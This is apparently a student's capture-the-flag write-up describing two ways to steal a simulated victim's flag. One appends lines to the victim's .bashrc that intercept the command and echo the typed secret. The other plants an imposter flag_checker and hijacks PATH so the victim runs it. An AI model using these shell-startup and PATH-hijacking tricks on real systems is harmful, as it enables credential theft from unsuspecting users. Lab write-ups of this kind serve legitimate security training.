## ✅ what i did  
1° WAY -> working only w/ .bashrc (no flag_checker)
-clicked start
-opened the terminal
-ran: 'which flag_checker' -> output: '/run/challenge/bin/flag_checker'
-opened a new terminal
-ran in the new terminal: 'vim /run/challenge/bin/flag_checker'
-ran in the first terminal: 'vim /home/zardus/.bashrc'
-added at the end:  'read garbage'
                    'echo -n "Type the flag, victim: "'               -> copied/pasted the first 3 lines of flag_checker (displayed in the other terminal)
                    'read -r candidate'
                    'echo $candidate'
-ran: '/challenge/victim'
-flag popped out

2° WAY -> using both .bashrc and flag_checker
-clicked start
-opened the terminal
-ran: 'which flag_checker' -> output: '/run/challenge/bin/flag_checker'
-ran: 'vim /run/challenge/bin/flag_checker'
-opened a new terminal
-ran in the new terminal: 'vim flag_checker'
-copied/pasted the first 3rd and 4th line of the other terminal (displaying the flag_checker contents) to this one: 'echo -n "Type the flag, victim: "'
                                                                                                                    'read -r candidate'
                                                                                                                    'echo $candidate'
-ran: 'chmod a+x flag_checker'
-ran: 'echo $PATH'
-copied the value
-ran: 'vim /home/zardus/.bashrc'
-added at the end: 'PATH=/home/hacker:[PASTED]'
-ran: '/challenge/victim'
-flag popped out

## 🧑🏾‍🏫 what this challenge teaches u
1° WAY
this was the first challenge that really pushed me untill now
from flag_checker i understood its behavior and tried to replicate it in .bashrc
after the login, zardus would have typed flag_checker to make the command run, so i decided to intercept it w/ 'read garbage' to avoid its execution
then, i knew he would input the flag but obfuscate so i echoed it to see the value

2° WAY
i replicated flag_checker but this time it only asked for the flag, read it and echoed it.
to make this one runnable instead of the original, i modified the PATH inside the .bashrc
